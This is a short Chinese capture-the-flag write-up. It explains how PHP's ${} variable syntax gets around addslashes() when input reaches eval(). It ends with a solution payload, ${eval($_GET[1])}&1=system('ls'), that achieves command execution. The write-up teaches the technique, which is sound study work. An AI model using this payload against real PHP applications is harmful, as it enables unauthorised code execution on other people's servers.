## 分析

刚开始尝试的是使用宽字节注入来绕过`addslashes()` 函数，由于这里没有设计数据库，而且网页编码也是 UTF-8 的，所以这里是走不通

这里主要涉及到的知识点是PHP的花括号变量语法 `${}`

这个和bash中的有点类似，用`{}`来界定变量。`${expression}` 和 `{${expression}}` 表达的意思是一样的。

```php
$abc  = 1;
echo "$abcd";	// $abcd未定义

echo "${abc}d";	// 结果是 1d
```

同时 `${var}` 也可使函数的执行结果作为变量，也就是能够在 `var` 中执行 `php` 函数

比如：

```php
var_dump(${phpinfo()} = 1);	// int(1)	会首先执行phpinfo函数，然后再把1赋值给函数的执行结果。
var_dump($a=123);		// int(1)
var_dump(${phpinfo()} === $TRUE);	// bool(true)	这里说明了phpinfo()函数执行成功后返回的是一个TRUE
```

例子：

```php
$test = "hello world";
function a(){
    $str = 'test';
return $str;
}
echo  "${a()}";
// result: hello world
```

从上面代码看出，先执行了 `a()` 函数，返回值为` test`，然后再 `${test}` 获取`$test` 变量的值，最终结果返回 `hello world`

所以对于这道题：

```php
$this->format = addslashes($format);
eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
```

解题方案：`${eval($_GET[1])}&1=system('ls');`

因为 `addslashes` 只对空字符，`\`，`'` 和` " `进行转义，所以这里我们就用上了 `${}` 这个技巧。

首先执行`${expression}` 里面的表达式 `$_GET[1]`, 然后再执行 `eval()`，最终就是执行了 `system('ls')`


# 参考链接
[https://www.chabug.org/ctf/425.html](https://www.chabug.org/ctf/425.html)